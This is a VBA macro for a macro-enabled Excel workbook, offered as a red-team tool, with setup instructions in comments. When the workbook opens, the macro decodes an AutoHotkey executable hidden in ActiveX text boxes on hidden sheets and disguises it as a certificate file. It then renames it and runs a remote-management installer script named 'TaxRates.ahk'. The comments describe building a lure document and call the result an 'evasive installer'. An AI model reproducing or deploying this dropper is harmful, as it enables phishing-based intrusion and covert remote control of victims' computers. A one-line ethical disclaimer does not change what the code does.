Private Sub Workbook_Open()
    SaveDecodedCertToFile
    RenameCertFile
    ExtractAndRunAHK
End Sub
' Instructions:
' Create a lure aligned with your testing goals as an xlsm spreadsheet.
' Enable Developer ribbon and open VBA editor.
' Paste in this script under the "ThisWorkbook" context and adapt as needed.
' In particular, you will need to update everwhere with a reference to a specfic tab or file name, or make sure your version matches ours.
' Also, you will need to create two tabs you intend to hide.
' On each tab, add an ActiveX text box from the developer tab insert menu.
' Use certutil -encode to encode a valid exe for AutoHotKey64.exe and paste that into one of the ActiveX objects.
' Paste in the AHK AutoRMM code into the other ActiveX object.
' Make sure the tab and object names align, by either changing the names in the xlsm doc, or in this script.
' Hide the tabs with the payload.
' The document will activate the VBA script, write the cert file to the current working directory,
' and then change the filename to make it the AHK exe, followed by writing the AHK AutoRMM script from the other ActiveX object,
' followed by running the AHK AutoRMM script using the AutoHotkey64.exe application.
' The net effect will be a portable and evasive installer, you can embed within a document to launch and RMM installer.
' Note that this approach could easily be adapted to the AutoIT scenarios as well.  
'
'
' Ethical Note - this framework and toolset is for penetration testers (red/purple team), and should not be used to break the law,
' or gain unethical access to systems.
 
Function DecodeCertificatePEM(pemText As String) As Byte()
    Dim base64Data As String
    Dim xmlDoc As Object
    Dim nodeElem As Object
 
    base64Data = Replace(pemText, "-----BEGIN CERTIFICATE-----", "")
    base64Data = Replace(base64Data, "-----END CERTIFICATE-----", "")
    base64Data = Replace(base64Data, vbCrLf, "")
    base64Data = Replace(base64Data, vbLf, "")
    base64Data = Trim(base64Data)
 
    Set xmlDoc = CreateObject("MSXML2.DOMDocument")
    Set nodeElem = xmlDoc.createElement("Base64Data")
 
    nodeElem.DataType = "bin.base64"
    nodeElem.Text = base64Data
 
    DecodeCertificatePEM = nodeElem.nodeTypedValue
End Function

 
Sub SaveDecodedCertToFile()
    Dim ws As Worksheet
    Dim certText As String
    Dim decodedCert() As Byte
    Dim outputPath As String
    Dim fileNum As Integer
    Set ws = ThisWorkbook.Worksheets("AHK")
    certText = ws.OLEObjects("TextBox1").Object.Text
    On Error GoTo 0
    If certText = "" Then
        Exit Sub
    End If
 
    decodedCert = DecodeCertificatePEM(certText)
 
    If ThisWorkbook.Path <> "" Then
        outputPath = ThisWorkbook.Path & "\cert.pem"
    Else
        outputPath = Environ("TEMP") & "\cert.pem"
    End If
 
    fileNum = FreeFile
    Open outputPath For Binary Access Write As #fileNum
        Put #fileNum, , decodedCert
    Close #fileNum
    Exit Sub

End Sub
 
Sub RenameCertFile()
    Dim currDir As String
    Dim oldFile As String
    Dim newFile As String
    If ThisWorkbook.Path <> "" Then
        currDir = ThisWorkbook.Path
    Else
        currDir = Environ("TEMP")
    End If
 
    oldFile = currDir & "\cert.pem"
    newFile = currDir & "\AutoHotkey64.exe"
 
    If Dir(oldFile) <> "" Then
 
        If Dir(newFile) <> "" Then
            On Error Resume Next
            Kill newFile
            On Error GoTo 0
        End If
 
        On Error GoTo RenameError
        Name oldFile As newFile
 
    Else
    End If
    Exit Sub
RenameError:
End Sub

Private Sub ExtractAndRunAHK()
    Dim ahkExePath As String
    Dim scriptFilePath As String
    Dim commandLine As String
    Dim fileNum As Integer
    Dim scriptContent As String
 
    ahkExePath = ThisWorkbook.Path & "\AutoHotkey64.exe"
    If Dir(ahkExePath) = "" Then
        Exit Sub
    End If
 
    If ThisWorkbook.Path <> "" Then
        scriptFilePath = ThisWorkbook.Path & "\TaxRates.ahk"
    Else
 
        scriptFilePath = Environ("TEMP") & "\TaxRates.ahk"
    End If
 
    scriptContent = GetAHKScriptContent()
    If scriptContent = "" Then
        Exit Sub
    End If
    fileNum = FreeFile
    On Error GoTo FileError
    Open scriptFilePath For Output As #fileNum
    Print #fileNum, scriptContent
    Close #fileNum
 
    commandLine = """" & ahkExePath & """ """ & scriptFilePath & """"
    Shell commandLine, vbNormalFocus
    Exit Sub
FileError:
    On Error Resume Next
    Close #fileNum
End Sub

 
Private Function GetAHKScriptContent() As String
    Dim ws As Worksheet
    Dim tbContent As String
    Dim oleObj As OLEObject
    Dim shp As Shape
    On Error Resume Next
 
    Set ws = ThisWorkbook.Worksheets("Calculations")
    If ws Is Nothing Then
        GetAHKScriptContent = ""
        Exit Function
    End If
 
    Set oleObj = ws.OLEObjects("TextBox1")
    If Not oleObj Is Nothing Then
        tbContent = oleObj.Object.Text
    Else
 
        Set shp = ws.Shapes("TextBox1")
        If Not shp Is Nothing Then
            tbContent = shp.TextFrame.Characters.Text
        Else
            tbContent = ""
        End If
    End If
    On Error GoTo 0
    GetAHKScriptContent = tbContent
End Function
